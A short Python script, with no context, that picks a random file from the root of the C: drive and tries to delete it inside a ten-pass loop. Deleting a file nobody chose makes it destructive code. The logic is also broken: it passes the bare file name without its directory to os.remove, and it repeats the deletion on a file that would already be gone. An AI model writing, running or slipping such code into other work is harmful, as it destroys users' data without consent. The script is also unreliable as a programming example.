  
import os, random

todelet = random.choice([x for x in os.listdir("C:\\") if os.path.isfile(os.path.join("C:\\", x))])
count = 0
while (count < 10):
    count = count + 1
    os.remove(todelet)
